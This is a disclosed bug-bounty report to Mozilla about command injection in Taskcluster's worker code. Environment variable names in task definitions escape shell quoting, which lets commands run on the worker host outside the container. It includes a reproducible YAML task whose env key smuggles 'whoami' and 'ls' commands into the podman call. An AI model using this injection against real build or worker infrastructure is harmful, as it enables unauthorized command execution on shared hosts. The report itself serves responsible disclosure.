# RCE on worker host due to unsanitized "env" variable name in task definition on community-tc.services.mozilla.com

## Report Details
- **Report ID**: 2221404
- **URL**: https://hackerone.com/reports/2221404
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-10-23T08:54:29.452Z
- **Disclosed**: 2024-12-08T11:04:29.792Z

## Reporter
- **Username**: ebrietas
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mozilla

## Vulnerability Information
## Summary:
This issue affects Taskcluster's worker code and not  just this instance but I did not see an easy way to report the vulnerability as well since I was unsure if this would qualify for the  Mozilla Client bug bounty. The task cluster definition attempts to escape parameters that are passed to the podman command prior to running the container to execute the task, the custom shell.escape function (https://github.com/taskcluster/shell/blob/master/shell.go)  is quite robust and is used on most user supplied parameters including docker image name, commands to run , and artifact path which prevents trivial command execution however it is not applied on the environment variable name itself allowing for command execution on the worker host.  Additionally, the community-tc.services.mozilla.com instance allows for any valid user to utilize an example worker group which allows for RCE on the worker host.


## Steps To Reproduce:

1. Create a github account if you do not have one and then login to https://community-tc.services.mozilla.com/ 
2. Visit https://community-tc.services.mozilla.com/tasks/create to create a new task. Copy and paste the following definition and then click the green save icon to run your task:
```yaml
retries: 0
created: '2023-10-23T08:10:11.044Z'
deadline: '2023-10-23T11:10:11.044Z'
expires: '2024-10-23T11:10:11.044Z'
taskQueueId: proj-misc/tutorial
projectId: none
tags: {}
scopes: []
payload:
  env:
# Commands to run in here
    test2 --help ; whoami ; ls -lah ;: '--help'
  image: ubuntu:latest
  command:
    - /bin/bash
    - '-c'
    - 'echo hello'
  maxRunTime: 5000
extra: {}
metadata:
  name: example-task
  description: An **example** task
  owner: name@example.com
  source: https://community-tc.services.mozilla.com/tasks/create
schedulerId: taskcluster-ui
```

{F2795414}

3. 
Wait for your task to run (it should fail) and then view the live logs to check for the output of the commands. 
{F2795415}

## Impact

## Summary:
Command execution outside of the intended container for the worker.

## Attachments
- chrome_GivgBsaNU7.png
- chrome_i6h61NCU3s.png
